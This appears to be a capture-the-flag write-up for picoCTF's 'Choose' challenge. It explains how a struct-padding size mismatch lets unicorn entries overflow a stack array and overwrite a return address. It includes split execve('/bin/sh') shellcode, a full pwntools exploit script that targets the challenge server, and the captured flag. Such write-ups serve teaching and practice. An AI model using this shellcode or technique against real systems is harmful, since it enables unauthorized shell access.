## Choose - 150

### Description

Unhappy that you can't choose which enemies to fight? [Choose](./choose) your own adventure! [Source](./source). Connect on shell2017.picoctf.com:12898. ASLR is not enabled.

### Hint

  - An assumption made in the code is wrong. Which assumption, and what does it allow you to do?

### Write up

The code assumes that all structs have same size.

```c
//Can use an orc ptr as all the structs are the same size.
        orc * tempEnemy = (orc *)(enemies + enemOffset);
```

But it's wrong because of the padding.

```c
typedef struct _orc{
    char type;
    short damage;
    // 1 byte padding
    int health;
    char name[12];
} orc;

typedef struct _unicorn{
    char type;
    // 3 byte padding
    int health;
    short damage;
    char name[12];
    // 2 byte padding
} unicorn;
```

actually, unicorn's size is 24 bytes, whereas orc's size is 20 bytes.

```c
#define ENEMSIZE sizeof(orc)
...
char enemies[ENEMSIZE * NUMMONSTERS];
```

But the code uses sizeof(orc) * NUMMONSTERS as a length of array.

So, we can overflow this array by filling this array with unicorns, and manipulate RET of runGame().

```
gdb-peda$ disas runGame
Dump of assembler code for function runGame:
   0x08049849 <+0>:	push   ebp
   0x0804984a <+1>:	mov    ebp,esp
   0x0804984c <+3>:	sub    esp,0xf8
```

we can manipulate RET by,

248(f8) + 4(SFP) + `\xff\xff\xff\xff`

If we generate 11 unicorns, the `\xff\xff\xff\xff` part will be 11th unicorn's name area[2:].

Then, what address should we use?

```
$ file choose
choose: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=952b7d0f1a0002e20d397504681611e4777811d6, not stripped
```

The file is statically linked but,

```
$ readelf -s choose | grep system           
   864: 080d4140    36 OBJECT  LOCAL  DEFAULT   10 system_dirs
   865: 080d412c    16 OBJECT  LOCAL  DEFAULT   10 system_dirs_len

$ readelf -s choose | grep exe              
       94: 080b9f00  2467 FUNC    LOCAL  DEFAULT    6 execute_cfa_program
       98: 080bb110  1978 FUNC    LOCAL  DEFAULT    6 execute_stack_op
     1197: 0809b960    88 FUNC    GLOBAL DEFAULT    6 _dl_make_stack_executable
     2234: 080ebab4     4 OBJECT  GLOBAL DEFAULT   24 _dl_make_stack_executable
```

We can't find system or execve functions.

So, we need to find some memory that we can put shellcode in.

```c
#define ENEMNAMELEN 12
...
char name[ENEMNAMELEN];
...
printf("Enter a name for this unicorn:\n");
    readWrapper(enemPtr->name, ENEMNAMELEN);
```

We can use name area that we can arbitrarily choose. But since the size of each name array is not enough to put whole shellcode in, we need to separate the shellcode.

I adapted shellcode from [here](http://shell-storm.org/shellcode/files/shellcode-811.php)

```
8048060: 31 c0                 xor    %eax,%eax
8048062: 50                    push   %eax
8048063: 68 2f 2f 73 68        push   $0x68732f2f
8048068: 68 2f 62 69 6e        push   $0x6e69622f
804806d: 89 e3                 mov    %esp,%ebx
804806f: 89 c1                 mov    %eax,%ecx
8048071: 89 c2                 mov    %eax,%edx
8048073: b0 0b                 mov    $0xb,%al
8048075: cd 80                 int    $0x80
8048077: 31 c0                 xor    %eax,%eax
8048079: 40                    inc    %eax
804807a: cd 80                 int    $0x80
```

and separated the shellcode using `EB cb` which is relative JMP.

```python
shells = [
    '\x31\xc0\x50\x68\x2f\x2f\x73\x68' + '\xeb\x0e',
    '\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1' + '\xeb\x0d',
    '\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40' + '\xeb\x0d',
    '\xcd\x80',
]
```

We will put that to unicorn[0~3].name. And set RET to unicorn[0].name.

Then we need to get start address of `enemies` array.

Fortunately, the ASLR is not set, so the address is not changing.

```c
if(ctfer.wizardSight){
    printf("Your sight shows the enemy at %p\n", enemy);
}
```

There is a wizardSight winning that give us the stack address. So we can get the address of `enemies` using it.

```python
from pwn import *
import sys
import struct

# relative jmp => eb <offset>
ORC_STRUCT_SIZE = 20
UNICORN_STRUCT_SIZE = 24
UNICORN_NAME_OFFSET = 10
ENEMNAMELEN = 12

shellcode_address = 0xffffdba4 - ORC_STRUCT_SIZE + UNICORN_NAME_OFFSET
shellcode_address = p32(shellcode_address)

shells = [
    '\x31\xc0\x50\x68\x2f\x2f\x73\x68' + '\xeb\x0e',
    '\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1' + '\xeb\x0d',
    '\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40' + '\xeb\x0d',
    '\xcd\x80',
]

p = remote('shell2017.picoctf.com', 12898)
# p = process(['./choose'])

# generate 11 unicorns
for i in range(11):
    p.sendline('u')

for i in range(len(shells)):
    p.sendline(shells[i])

for i in range(11-len(shells)-1):
    p.sendline('asdf')

p.sendline('aa'+shellcode_address)

for i in range(16):
    p.sendline('f')
p.interactive()
```


> ff30b8aa5106b865c5927cbf4a729a1f
